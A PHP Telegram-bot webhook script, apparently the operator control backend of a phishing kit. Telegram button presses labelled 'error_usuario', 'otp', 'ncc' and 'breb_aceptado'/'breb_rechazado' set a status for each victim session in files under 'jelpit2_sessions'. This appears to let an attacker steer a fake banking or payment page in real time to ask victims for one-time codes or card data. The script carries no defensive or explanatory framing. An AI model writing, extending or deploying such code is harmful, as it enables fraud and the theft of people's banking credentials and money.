<?php
require_once __DIR__ . '/config.php';

$raw  = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!isset($data['callback_query'])) exit;

$cb     = $data['callback_query'];
$cbId   = $cb['id'];
$cbData = $cb['data'] ?? '';
$msgId  = $cb['message']['message_id'] ?? null;
$chatId = $cb['message']['chat']['id']  ?? null;

$parts  = explode(':', $cbData, 2);
$action = $parts[0] ?? '';
$sid    = preg_replace('/[^a-zA-Z0-9_\-]/', '', $parts[1] ?? '');

function tgCall(string $method, array $payload): void {
    $token = defined('TG_TOKEN') ? TG_TOKEN : (defined('TELEGRAM_BOT_TOKEN') ? TELEGRAM_BOT_TOKEN : '');
    $ch = curl_init('https://api.telegram.org/bot' . $token . '/' . $method);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($payload),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 6,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function updateSession(string $sid, string $status): void {
    $dir  = sys_get_temp_dir() . '/jelpit2_sessions/';
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    $file = $dir . $sid . '.json';
    file_put_contents($file, json_encode(['status' => $status]));
}

function removeButtons(string $cbId, ?int $msgId, $chatId): void {
    tgCall('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => '✅ Enviado']);
    if ($msgId && $chatId) {
        tgCall('editMessageReplyMarkup', [
            'chat_id'      => $chatId,
            'message_id'   => $msgId,
            'reply_markup' => ['inline_keyboard' => []],
        ]);
    }
}

if ($action === 'error_usuario' && $sid) {
    updateSession($sid, 'error_usuario');
    removeButtons($cbId, $msgId, $chatId);
}

if ($action === 'otp' && $sid) {
    updateSession($sid, 'otp');
    removeButtons($cbId, $msgId, $chatId);
}

if ($action === 'ncc' && $sid) {
    updateSession($sid, 'ncc');
    removeButtons($cbId, $msgId, $chatId);
}

if ($action === 'breb_aceptado' && $sid) {
    updateSession($sid, 'breb_aceptado');
    removeButtons($cbId, $msgId, $chatId);
}

if ($action === 'breb_rechazado' && $sid) {
    updateSession($sid, 'breb_rechazado');
    removeButtons($cbId, $msgId, $chatId);
}
